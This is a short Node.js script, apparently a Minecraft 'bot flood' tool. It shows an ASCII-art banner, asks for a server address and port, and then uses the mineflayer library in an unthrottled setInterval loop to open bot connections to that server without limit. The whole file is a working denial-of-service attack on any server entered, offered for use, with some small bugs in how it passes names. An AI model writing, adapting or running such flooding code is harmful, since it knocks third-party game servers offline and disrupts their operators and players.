const mineflayer = require("mineflayer");
const rl = require("readline").createInterface({
  input: process.stdin,
  output: process.stdout,
  prompt: "> "
});
//-----------------------
let randomanme = "";

function GenName() {
  randomanme = "gg" + Math.random().toString(36).substring(2, 10);
}
GenName();
//-----------------------
let ip = "";
let port = "";
//-----------------------
function FloodBot(port, ip, randomname) {
  GenName();
  const bot = mineflayer.createBot({
    host: ip,
    port: port,
    username: randomname,
    version: "1.19.2",
  });
  bot.on("kicked", (reason) => {
    console.log(reason);
  });
}
//-----------------------
  console.log("\x1b[33m" + "  ██████   █████ ███████████   █████████    █████████  █████   ████    ██████   ██████   █████████  ███████████  ███████████");
  console.log("\x1b[33m" + " ░░██████ ░░███ ░█░░░███░░░█  ███░░░░░███  ███░░░░░███░░███   ███░    ░░██████ ██████   ███░░░░░███░░███░░░░░███░█░░░███░░░█");
  console.log("\x1b[93m" + "  ░███░░███░███     ░███     ░███████████ ░░█████████  ░███████        ░███░░███ ░███ ░███          ░██████████     ░███    ");
  console.log("\x1b[93m" + "  ░███░███ ░███ ░   ░███  ░  ░███    ░███ ░███    ░░░  ░███  ███       ░███░█████░███  ███     ░░░  ░███    ░███░   ░███  ");
  console.log("\x1b[33m" + "  ░███ ░░██████     ░███     ░███░░░░░███  ░░░░░░░░███ ░███░░███       ░███ ░░░  ░███ ░███          ░███░░░░░███    ░███    ");
  console.log("\x1b[93m" + "  ░███  ░░█████     ░███     ░███    ░███  ███    ░███ ░███ ░░███      ░███      ░███ ░░███     ███ ░███    ░███    ░███    ");
  console.log("\x1b[93m" + "  █████  ░░█████    █████    █████   █████░░█████████  █████ ░░████    █████     █████ ░░█████████  ███████████     █████   ");
  console.log("\x1b[93m" + " ░░░░░    ░░░░░    ░░░░░    ░░░░░   ░░░░░  ░░░░░░░░░  ░░░░░   ░░░░    ░░░░░     ░░░░░   ░░░░░░░░░  ░░░░░░░░░░░     ░░░░░    ");
  console.log("\x1b[33m" + "                                                                                                                             ")
  console.log("\x1b[33m" + "                                                                                         copiright by xs7david               ");
console.log("\x1b[91m" + "Insert ADRESS:PORT                    or press ctrl + c to exit");
rl.on("line", (input) => {
  ip = input.split(":")[0];
  port = input.split(":")[1];
  console.log("Flooding...");
  console.log("IP" + ip + "||" + "PORT" + port + "||" + "NAME" + randomanme);
  if (ip !== "") {
    setInterval(() => {
      FloodBot(port, ip, randomanme);
    });
  }
});
//-----------------------
